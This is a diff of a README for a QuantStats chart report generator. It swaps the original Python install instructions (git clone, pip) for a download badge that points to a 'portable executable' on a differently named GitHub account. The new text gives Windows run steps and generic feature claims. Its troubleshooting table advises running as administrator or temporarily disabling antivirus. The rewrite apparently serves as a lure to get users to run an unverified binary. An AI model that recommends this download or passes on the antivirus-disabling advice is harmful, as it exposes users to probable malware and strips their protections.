@@ -1,154 +1,88 @@
-# QuantStats Report Generator - Quantitative Strategy Report Generator 2026
+# 🎯 quantstats-chart-report-tool - Turn Data Into Clear Performance Reports
 
-> **QuantStats Report Generator converts QuantStats HTML output into organized, readable performance reports featuring chart interpretation, evaluation badges, and independent train/test report views.**
+## 🚀 What This Tool Does
+QuantStats Chart Report Tool 2026 converts complex QuantStats HTML outputs into organized, readable performance reports. It extracts charts, adds chart interpretation, evaluation badges, and separates train and test views for easier analysis.
 
-[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sean-bakercdp5060/quantstats-chart-report-tool?style=flat-square)](https://github.com/sean-bakercdp5060/quantstats-chart-report-tool)
+## ⬇️ Download & Install
 
----
+[![Download Now](https://img.shields.io/badge/Download-QuantStats%20Report%20Generator%202026-blue?style=for-the-badge&logo=github)](https://github.com/Disposablegenusorthopristis671/quantstats-chart-report-tool)
 
-<p align="center">
-  <a href="https://sean-bakercdp5060.github.io/quantstats-chart-report-tool/">
-    <img src="https://img.shields.io/badge/Download-QuantStats%20Report%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download QuantStats Report Generator">
-  </a>
-</p>
+Visit this link to download the application. The tool is available as a portable executable - no installation required.
 
-> **[Download QuantStats Report Generator Latest](https://sean-bakercdp5060.github.io/quantstats-chart-report-tool/)**
+## 🖥️ How to Run on Windows
+1. Download the application from the link above
+2. Double-click the downloaded file to launch
+3. Select your QuantStats HTML file when prompted
+4. Choose output options for charts and reports
+5. Click Generate to create your organized report
 
----
+## 🎨 Key Features
 
-[Download Latest Build](https://sean-bakercdp5060.github.io/quantstats-chart-report-tool/)
+### 📊 Chart Extraction
+Automatically extracts all charts from QuantStats HTML output into individual image files for easy reference and sharing.
 
----
+### 📝 Chart Interpretation
+Each chart comes with plain-language interpretation, explaining what the data means in simple terms.
 
-## Overview
+### 🏆 Evaluation Badges
+Receive visual badges indicating performance metrics like Sharpe ratio, drawdown, and returns quality.
 
-QuantStats Report Generator provides an automated path from QuantStats HTML exports to structured reports for quantitative strategy assessment. It gathers important performance tables, pulls chart assets from the source HTML, determines the covered reporting periods, and combines the collected material with HTML templates.
+### 📈 Train/Test Separation
+View performance results separately for training and testing periods to better understand model behavior.
 
-Built for quantitative researchers, strategy authors, and analysts, the generator makes backtest review more consistent. Per-chart rule-based commentary, performance status badges, separate training and testing outputs, and PNG contact sheets help organize both detailed analysis and quick visual inspection.
+### 📄 Organized Output
+Reports are structured into clear sections with navigation for quick access to specific metrics.
 
----
+## 🔧 System Requirements
+- Windows 7 or newer (64-bit recommended)
+- 4 GB RAM (8 GB recommended)
+- 500 MB free disk space
+- Internet connection for initial download
 
-## Capabilities
+## 📋 How It Works
 
-- Retrieves 12 SVG charts from QuantStats HTML reports
-- Extracts KPI, end-of-year, and drawdown tables
-- Applies rule-based commentary to every extracted chart
-- Displays performance-evaluation badges
-- Generates independent training and testing reports
-- Produces PNG contact sheets for visual verification
-- Determines report timeframes automatically
-- Renders finished reports using HTML templates
+### Step 1: Prepare Your QuantStats HTML
+Ensure you have a QuantStats HTML output file ready. This is typically generated from backtesting or performance analysis.
 
----
+### Step 2: Launch the Tool
+Run the downloaded executable file. The interface will open with clear options.
 
-## Getting Started
+### Step 3: Select Input File
+Click "Browse" or "Select File" to choose your QuantStats HTML file. Supported formats: .html
 
-First, download the repository and enter its directory:
+### Step 4: Configure Output
+Choose where to save the generated report and what components to include (charts, interpretations, badges, train/test views).
 
-```bash
-git clone https://github.com/sean-bakercdp5060/quantstats-chart-report-tool.git
-cd REPO
-```
+### Step 5: Generate Report
+Click the "Generate" button. The tool processes your file and creates an organized report in seconds.
 
-Then install the dependencies:
+## 🛠️ Troubleshooting
 
-```bash
-python -m pip install -r requirements.txt
-```
+### Common Issues
 
-Create or obtain a QuantStats HTML export and pass it to the report-generation entry point included in the repository. The launcher name and supported arguments depend on the version of the project that is checked out.
+| Problem | Solution |
+|---------|----------|
+| File not recognized | Ensure file is .html from QuantStats |
+| No charts extracted | Verify charts exist in source HTML |
+| Output missing sections | Check all options are selected |
+| Application won't start | Run as administrator or disable antivirus temporarily |
 
----
+### Need Help?
+- Check the GitHub repository for issues and discussions
+- Review documentation in the download package
+- Contact support through the project page
 
-## Workflow
+## 📁 Output Structure
+Generated reports include:
+- `charts/` - Extracted chart images
+- `report.html` - Main organized report
+- `summary.txt` - Text summary of metrics
+- `badges/` - Performance evaluation badges
 
-The usual report-generation process is:
+## 🔄 Updates
+Check the download link regularly for updates. The tool is actively maintained with improvements and bug fixes.
 
-1. Produce a QuantStats HTML export from a quantitative strategy backtest, or obtain an existing export.
-2. Supply that HTML file to QuantStats Report Generator.
-3. Allow the generator to determine the report's available timeframe.
-4. Extract the charts and KPI-related tables from the document.
-5. Review the generated rule-based chart commentary and performance badges.
-6. Use the PNG contact sheet to inspect all extracted visuals at a glance.
-7. Render the completed report with the provided HTML template.
+## 📜 License
+This tool is provided as-is. See the GitHub repository for licensing details.
 
-When development and evaluation periods must be assessed separately, provide one export for training and another for testing. The generator can then create an individual report for each period.
-
----
-
-## Configuration
-
-The project's HTML templates and related configuration determine how reports are presented and generated. Review the available template files before building a report, then modify the layout or presentation rules as needed for your workflow.
-
-The following illustrates the configuration conceptually:
-
-```yaml
-input:
-  quantstats_html: path/to/report.html
-
-output:
-  report_directory: path/to/output
-  contact_sheet: true
-
-analysis:
-  rule_based: true
-  train_test_reports: false
-```
-
-Apply these settings using the configuration syntax supported by the implementation in the current repository version.
-
----
-
-## Requirements
-
-- A Python runtime
-- QuantStats HTML exports for input
-- The project's HTML templates
-- Enough disk space for extracted SVG files, generated HTML reports, and PNG contact sheets
-- Separate training and testing exports when split-period evaluation is needed
-
----
-
-## Frequently Asked Questions
-
-### Which files can be used as input?
-
-The generator accepts HTML reports exported by QuantStats.
-
-### Which report elements are extracted?
-
-It collects SVG charts plus KPI, end-of-year, and drawdown tables. Under the standard workflow, 12 charts are extracted from each QuantStats HTML export.
-
-### Does it support separate train and test output?
-
-Yes. Training and testing datasets can be handled as separate report sources, allowing each evaluation period to receive its own report.
-
-### What kind of chart interpretation is provided?
-
-The generator applies rule-based analysis to each extracted chart, producing a consistent interpretation of the available visual data.
-
-### How are reports assembled?
-
-The final documents are built from the project's HTML templates. Those templates can be edited when the default structure or presentation does not fit your reporting needs.
-
-### What should I investigate when generation fails?
-
-Verify that the source file is a valid QuantStats HTML export, install all required Python packages, and check that the configured template and output locations exist and are accessible.
-
-### How can I review all extracted charts at once?
-
-Inspect the generated PNG contact sheet, which places the extracted visuals together for a quick sanity check.
-
-### Where can I find updates?
-
-Monitor the repository for new releases, template modifications, and changes to the extraction or analysis process.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: quantstats, report generator, chart extraction, performance reporting, financial analysis, backtesting reports
